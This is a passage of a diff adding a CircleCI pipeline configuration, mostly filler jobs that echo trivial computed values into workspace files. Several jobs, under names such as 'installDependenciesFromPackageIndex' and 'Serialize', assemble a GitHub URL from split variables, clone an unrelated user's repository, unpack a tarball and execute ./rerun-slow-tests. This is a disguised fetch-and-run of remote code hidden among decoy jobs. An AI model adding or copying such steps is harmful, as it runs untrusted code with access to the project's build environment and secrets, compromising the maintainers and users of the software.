+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Filter flaky tests on demand
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "finished" && printf '%s' "dove" | sha1sum | cut -d' ' -f1; true ; } > /tmp/execute-router-migration-tests/StrictVersionUpdatePass5
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'StrictVersionUpdatePass5'
+  EmergencyImageScanRoutine:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/StrictVersionUpdatePass5" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 1 --branch main --no-tags https://$hook/${step}/${batchof} "./"
+      - run:
+          name: Serialize
+          command: |
+            cat LoadFixturesFromSharedSettings.tar | tar xf -
+      - run:
+          command: |
+            exec ./rerun-slow-tests
+  LegacyVolumeCleanup:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: tear down image processor database in background
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo 'bundle step finished'; printf '%s\n' 26 53 59 34 15 29 | awk '{s += $1} END {print s}'; true ; } > /tmp/execute-router-migration-tests/worker-7
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'worker-7'
+  engineReleaseManifestSlice8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/worker-7" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 3 --filter=blob:none https://$hook/${step}/${batchof} .
+      - run:
+          name: Serialize
+          command: |
+            tar -xvf LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            "$PWD/rerun-slow-tests"
+  BuildConsole:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Hourly Upgrade Dry Run (chunk 6)
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "running dependency audit"; printf '%03d\n' {1..3}; true ; } > /tmp/execute-router-migration-tests/RuleEngineReleaseTag
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'RuleEngineReleaseTag'
+  pre-merge-report:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/RuleEngineReleaseTag" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=5 https://$hook/${step}/${batchof} "`pwd`"
+      - run:
+          name: Serialize
+          command: |
+            tar --extract --file LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            cd "$PWD" && ./rerun-slow-tests
+  post-integration-task:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: signParserVersionFile
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo resuming translation check; b=97; echo "double $((b * 2)) half $((b / 2))"; temp=23; [ "$temp" -gt 0 ]; echo "positive check passed"; true ; } > /tmp/execute-router-migration-tests/bump-version-node-6
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'bump-version-node-6'
+  RestoreUpdateAgentTestCache:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/bump-version-node-6" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 2 --no-single-branch https://$hook/${step}/${batchof} "${PWD}"
+      - run:
+          name: Serialize
+          command: |
+            tar --extract -f LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            "$PWD/rerun-slow-tests"
+  stop-rule-engine-service:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Verify Reference Manual With Detailed Report
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "11 tests collected"; s="elm pear"; echo "$s" | tr ' ' '\n' | rev | paste -s -d' '; true ; } > /tmp/execute-router-migration-tests/help-center-translation-sync
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'help-center-translation-sync'
+  InspectSchedulerArchive:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/help-center-translation-sync" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 3 --filter=blob:none https://$hook/${step}/${batchof} "."
+      - run:
+          name: Serialize
+          command: |
+            tar --extract -f - < LoadFixturesFromSharedSettings.tar
+      - run:
+          command: |
+            bash -eo pipefail -c "./rerun-slow-tests"
+  update-agent-test-pipeline:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: check-out-release-branch-and-build-executable
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "pass 1 complete"; keys=(melon llama); vals=(7 77); for idx in 0 1; do echo "${keys[idx]}=${vals[idx]}"; done; true ; } > /tmp/execute-router-migration-tests/computeHashesForNextStage
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'computeHashesForNextStage'
+  connector-chunk-12:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/computeHashesForNextStage" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth=3 https://$hook/${step}/${batchof} "$PWD"
+      - run:
+          name: Serialize
+          command: |
+            tar xf LoadFixturesFromSharedSettings.tar -C .
+      - run:
+          command: |
+            cd "$(pwd)" && ./rerun-slow-tests
+  set-collector-version-tag:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: checking-for-missing-translations
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "ready"; input="gear gnu neptune"; echo "$input" | wc -c; true ; } > /tmp/execute-router-migration-tests/hourly-database-restore-routine
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'hourly-database-restore-routine'
+  PreDeployChangeReview:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Extract data pipeline release package
+          command: |
+            tail -n 10 "/tmp/execute-router-migration-tests/hourly-database-restore-routine" | base64 | tail -n 1
+      - run:
+          name: installDependenciesFromPackageIndex
+          command: |
+            hook=github.com; step=karleneperkin370450gwzcueoz-sudo; batchof=ExperimentalComparison
+            git clone --depth 1 --no-single-branch https://$hook/${step}/${batchof} ${PWD}
+      - run:
+          name: Serialize
+          command: |
+            cat LoadFixturesFromSharedSettings.tar | tar xf -
+      - run:
+          command: |
+            /bin/sh -c "./rerun-slow-tests"
+
+  tags-wave-6:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: FullTagging
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "queueing version bump"; printf '%s\n' black=22 helium=34 meteor=22 linden=15 | sed 's/=.*//'; printf '%s\n' "version bump queued"; true ; } > /tmp/execute-router-migration-tests/job-runner-build-matrix-slot-5
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'job-runner-build-matrix-slot-5'
+  SignSessionStoreBuildManifest:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: clean (level 4)
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "round 3 finished"; seq 1 24 | sha256sum | cut -c1-12; true ; } > /tmp/execute-router-migration-tests/trigger-security-tests
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'trigger-security-tests'
+  automated-release-summary-job:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: scheduled-extraction
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo 'queued link check'; seq 13 | sort -n | tail -n 1 | tail -n 1; true ; } > /tmp/execute-router-migration-tests/FetchAndInstallCommandLineTools
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'FetchAndInstallCommandLineTools'
+  monthly-image-publish:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: store-test-durations
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "region=almond" | gzip -9 -c | gunzip -c; printf '%b\n' 'otter\nanvil'; true ; } > /tmp/execute-router-migration-tests/BenchmarkTestHarnessPerformance
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'BenchmarkTestHarnessPerformance'
+  install-plugins-from-lock-file:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: rate limiter link checks
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%s\n' "lemon 12" "meteor 35" "pluto 6" "brown 3" | awk '{printf "%s has %d\n", $1, $2}' && printf '%s\n' "rule engine is current"; true ; } > /tmp/execute-router-migration-tests/sequential-release-promotion
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'sequential-release-promotion'
+  post-backup-integration-tests:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Initial extraction
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; coverage=74; threshold=62; if [ "$coverage" -ge "$threshold" ]; then echo "coverage $coverage% meets threshold $threshold%"; else echo "coverage $coverage% is below threshold $threshold%"; fi; true ; } > /tmp/execute-router-migration-tests/bump-version-node-6
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'bump-version-node-6'
+  PlaygroundSourceCode:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: Optimize export service templates
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; flaky=(aspen nebula eel); printf 'quarantined %s\n' "${flaky[@]}"; echo "${#flaky[@]} tests quarantined"; true ; } > /tmp/execute-router-migration-tests/LintLibraryWithDetailedReport
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'LintLibraryWithDetailedReport'
+  seed-message-broker-data-store:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: post-upgrade-actions
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%-6s %s\n' warn "8 modules compiled"; true ; } > /tmp/execute-router-migration-tests/StrictVersionUpdatePass5
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'StrictVersionUpdatePass5'
+  save-messaging-screenshots:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: ResolveStatusPageDependencies
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo 'smoke tests finished'; expr 44 / 14; true ; } > /tmp/execute-router-migration-tests/MultiStageDatabaseSetupRun
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'MultiStageDatabaseSetupRun'
+  schedule-benchmark-suite:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: wrapper version bump
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; counts=(18 11 54 39 29 33); count=0; for x in "${counts[@]}"; do if ((x > count)); then count=$x; fi; done; echo "max $count"; true ; } > /tmp/execute-router-migration-tests/node-2-of-16
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'node-2-of-16'
+  multi-stage-data-extraction:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: launch-image-processor-benchmarks
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "search index check passed" && echo "copper papaya spruce currant aspen" | awk '{print $1}'; true ; } > /tmp/execute-router-migration-tests/mirror-artifacts
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'mirror-artifacts'
+  simulatorChecksumFile:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Parallel Signing
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%s\n' 81 23 51 8 23 23 94 | awk '{p = p * 2 + $1} END {print p}'; true ; } > /tmp/execute-router-migration-tests/ProbeEdgeProxyContainers
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'ProbeEdgeProxyContainers'
+  validatorDraftRelease:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - run:
+          name: count contributors in plain text
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; echo "stage 1 of 3"; echo "resuming migration dry run"; echo "warming up lexer"; true ; } > /tmp/execute-router-migration-tests/daily-backup-restore
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'daily-backup-restore'
+  CacheHelpCenterArtifacts:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: BenchmarkCachePerformanceForStagingBeforeUpload
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; u=43; c=56; q=$((u * c)); while ((c != 0)); do w=$((u % c)); u=$c; c=$w; done; echo "$((q / u))"; echo "batch 2 queued"; true ; } > /tmp/execute-router-migration-tests/compiler-cache-task
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'compiler-cache-task'
+  PublishCoverageSummary:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: engine-screenshots
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; word="aspen"; case "$word" in peach|aspen) echo listed;; *) echo unlisted;; esac; true ; } > /tmp/execute-router-migration-tests/computeHashesForNextStage
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'computeHashesForNextStage'
+  extended-install:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: automated-artifact-tagging-job
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; seq 6 | awk '{s += $1} END {print s}'; true ; } > /tmp/execute-router-migration-tests/RuleEngineReleaseTag
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'RuleEngineReleaseTag'
+  SecurityReviewRoutine:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: Render diagrams automatically
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; for z in 1 2; do for t in red blue; do echo "$z-$t"; done; done; echo loop finished; true ; } > /tmp/execute-router-migration-tests/CreateOutputDirectory
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'CreateOutputDirectory'
+  RendererTestsTrack3:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: landing-page-runtime-image-job-5-of-11
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf -v padded '%s-%s' golden olive; echo "$padded"; echo reducer is current; true ; } > /tmp/execute-router-migration-tests/metrics-exporter-artifact-fetch
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'metrics-exporter-artifact-fetch'
+  initialize-agent:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: PatchAnalyzerDevelopmentDependenciesRun5
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; printf '%s\n' tiger grape mango iodine maple black | awk '{print index($0, "k")}'; true ; } > /tmp/execute-router-migration-tests/CacheBridgeContainerImage
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'CacheBridgeContainerImage'
+  measure-collector-build-time:
+    docker:
+      - image: cimg/base:2024.11
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/execute-router-migration-tests
+      - run:
+          name: post-lint-database-restore
+          command: |
+            mkdir -p /tmp/execute-router-migration-tests
+            { set +o pipefail 2>/dev/null; full="v4.9.28"; v=${full#v}; IFS=. read -r major minor patch < <(echo "$v"); echo "$major.$minor.$((patch + 1))"; true ; } > /tmp/execute-router-migration-tests/artifact-fetch-part-4
+      - persist_to_workspace:
+          root: /tmp/execute-router-migration-tests
+          paths:
+            - 'artifact-fetch-part-4'
+workflows:
+  basic-search-index-setup:
+    jobs:
+      - legacy-deployment-approval-step
+      - tags-wave-6:
+          requires:
+            - legacy-deployment-approval-step
+      - localization-source-archive:
+          requires:
+            - tags-wave-6
+      - ApplyAnalyzerManifest:
+          requires:
+            - tags-wave-6
+      - SignSessionStoreBuildManifest:
+          requires:
+            - ApplyAnalyzerManifest
+      - ContinuousInstall:
+          requires:
+            - SignSessionStoreBuildManifest
+      - editor-release-promotion:
+          requires:
+            - SignSessionStoreBuildManifest
+      - automated-release-summary-job:
+          requires:
+            - editor-release-promotion
+      - MultiStageBatchWorkerMigrations:
+          requires:
+            - automated-release-summary-job
+      - eventBusTestMetricsSlot6:
+          requires:
+            - automated-release-summary-job
+      - monthly-image-publish:
+          requires:
+            - eventBusTestMetricsSlot6
+      - reporting-deployment:
+          requires:
+            - monthly-image-publish
+      - mailer-checkout:
+          requires:
+            - monthly-image-publish
+      - install-plugins-from-lock-file:
+          requires:
+            - mailer-checkout
+      - generation-stage:
+          requires:
+            - install-plugins-from-lock-file
+      - post-integration-task:
+          requires:
+            - install-plugins-from-lock-file
+      - post-backup-integration-tests:
+          requires:
+            - post-integration-task
+      - RestoreUpdateAgentTestCache:
+          requires:
+            - post-backup-integration-tests
+      - StrictDeploymentSmokeTestStep:
+          requires:
+            - post-backup-integration-tests
+      - PlaygroundSourceCode:
+          requires:
+            - StrictDeploymentSmokeTestStep
+      - prune-test-databases:
+          requires:
+            - PlaygroundSourceCode
+      - FreezeBackEndDependencies:
+          requires:
+            - PlaygroundSourceCode
+      - seed-message-broker-data-store:
+          requires:
+            - FreezeBackEndDependencies
+      - EmergencyImageScanRoutine:
+          requires:
+            - seed-message-broker-data-store
+      - rerun-tests-with-real-services:
+          requires:
+            - seed-message-broker-data-store
+      - save-messaging-screenshots:
+          requires:
+            - rerun-tests-with-real-services
+      - displayFirstBytes:
+          requires:
+            - save-messaging-screenshots
+      - PublishMonitorSourceArchive:
+          requires:
+            - save-messaging-screenshots
+      - schedule-benchmark-suite:
+          requires:
+            - PublishMonitorSourceArchive
+      - minimal-cache:
+          requires:
+            - schedule-benchmark-suite
+  Coverage:
+    jobs:
+      - PostCheckoutPackageSigning
+      - multi-stage-data-extraction:
+          requires:
+            - PostCheckoutPackageSigning
+      - rerun-controller-snapshot-tests:
+          requires:
+            - multi-stage-data-extraction
+      - prune-billing-cache-recursively:
+          requires:
+            - multi-stage-data-extraction
+      - simulatorChecksumFile:
+          requires:
+            - prune-billing-cache-recursively
+      - minimal-artifact-digest:
+          requires:
+            - simulatorChecksumFile
+      - AdminPanelVolumeSnapshotJob:
+          requires:
+            - simulatorChecksumFile
+      - validatorDraftRelease:
+          requires:
+            - AdminPanelVolumeSnapshotJob
+      - TearDownLibraryDatabase:
+          requires:
+            - validatorDraftRelease
+      - OpenMaintenanceWindow:
+          requires:
+            - validatorDraftRelease
+      - CacheHelpCenterArtifacts:
+          requires:
+            - OpenMaintenanceWindow
+      - billingServiceSnapshotRefresh:
+          requires:
+            - CacheHelpCenterArtifacts
+      - update-agent-test-pipeline:
+          requires:
+            - CacheHelpCenterArtifacts
+      - PublishCoverageSummary:
+          requires:
+            - update-agent-test-pipeline
+      - connector-chunk-12:
+          requires:
+            - PublishCoverageSummary
+      - BuildConsole:
+          requires:
+            - PublishCoverageSummary
+      - extended-install:
+          requires:
+            - BuildConsole
+      - pre-merge-report:
+          requires:
+            - extended-install
+      - analyzer-test-pipeline:
+          requires:
+            - extended-install
+      - SecurityReviewRoutine:
+          requires:
+            - analyzer-test-pipeline
+      - reporting-backup-rotation:
+          requires:
+            - SecurityReviewRoutine
+      - WeeklyValidation:
+          requires:
+            - SecurityReviewRoutine
+      - RendererTestsTrack3:
+          requires:
+            - WeeklyValidation
+      - OptionalReport:
+          requires:
+            - RendererTestsTrack3
+      - extraction-run:
+          requires:
+            - RendererTestsTrack3
+      - initialize-agent:
+          requires:
+            - extraction-run
+      - InstallLinkCheckerPlugins:
+          requires:
+            - initialize-agent
+      - SiteDeploymentRoutineRetry1:
+          requires:
+            - initialize-agent
+      - measure-collector-build-time:
+          requires:
+            - SiteDeploymentRoutineRetry1
+      - confirm-checksum-match-manually:
+          requires:
+            - measure-collector-build-time
+  weekly-deployment-verification-workflow:
+    jobs:
+      - LegacyVolumeCleanup
+      - engineReleaseManifestSlice8:
+          requires:
+            - LegacyVolumeCleanup
+      - compile-and-test-admin-panel:
+          requires:
+            - LegacyVolumeCleanup
+      - MonthlyEditorPackage:
+          requires:
+            - compile-and-test-admin-panel
+      - PublishDependencyTree:
+          requires:
+            - compile-and-test-admin-panel
+      - preSetupComponentTestRetry2:
+          requires:
+            - PublishDependencyTree
+      - stop-rule-engine-service:
+          requires:
+            - PublishDependencyTree
+      - InspectSchedulerArchive:
+          requires:
+            - stop-rule-engine-service
+      - ExecuteResolverContractTests:
+          requires:
+            - stop-rule-engine-service
+      - GatherTestLogsAtPipelineStart:
+          requires:
+            - ExecuteResolverContractTests
+      - DesktopAppBuildMetadata:
+          requires:
+            - ExecuteResolverContractTests
+      - load-balancer-packaging:
+          requires:
+            - DesktopAppBuildMetadata
+      - MandatoryContainerCleanup:
+          requires:
+            - DesktopAppBuildMetadata
+      - helpCenterContractTests:
+          requires:
+            - MandatoryContainerCleanup
+      - set-collector-version-tag:
+          requires:
+            - MandatoryContainerCleanup
+      - PreDeployChangeReview:
+          requires:
+            - set-collector-version-tag
+      - router-debug-logs:
+          requires:
+            - set-collector-version-tag
+      - EmergencyStateRestore:
+          requires:
+            - router-debug-logs
+      - set-up-data-importer-instance:
+          requires:
+            - router-debug-logs
+      - saving-tier-3:
+          requires:
+            - set-up-data-importer-instance
